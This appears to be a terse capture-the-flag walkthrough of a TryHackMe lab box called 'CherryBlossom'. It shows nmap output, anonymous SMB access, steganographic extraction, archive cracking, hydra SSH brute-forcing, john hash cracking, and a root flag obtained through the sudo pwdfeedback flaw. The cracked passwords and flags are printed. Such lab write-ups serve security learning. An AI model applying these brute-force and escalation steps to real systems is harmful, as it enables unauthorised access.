# CherryBlossom 

> VOiD | Wednesday 23 March 2022 01:29:22 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.119.90

## Nmap
```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)
|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)
|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 139 [smb]
```bash
smbclient -L 10.10.119.90      
Enter WORKGROUP\void's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      Anonymous File Server Share
	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available


we get a journal.txt which is an png image'

if we do stegpy the file we get a zip which is acctually zip
we correct its headers : 50 4B 03 04

september        (best.zip/Journal.ctz)     

file Journal.ctz
Journal.ctz: 7-zip archive data, version 0.4

cracked : tigerlily

gives Journal.ctd
THM{054a8f1db7618f8f6a41a0b3349baa11}

hydra -V -l lily -P passwords ssh://10.10.119.90
[22][ssh] host: 10.10.119.90   login: lily   password: Mr.$un$hin3

john unshadowed --wordlist=./passwords
Mr.$un$hin3      (lily)     
##scuffleboo##   (johan)  

```

## USER [johan]
```bash
johan : ##scuffleboo##
sudo -l
gives ****** so we have pwdfeedback vul

root@cherryblossom:/root# cat root.txt 
THM{d4b5e228a567288d12e301f2f0bf5be0}

```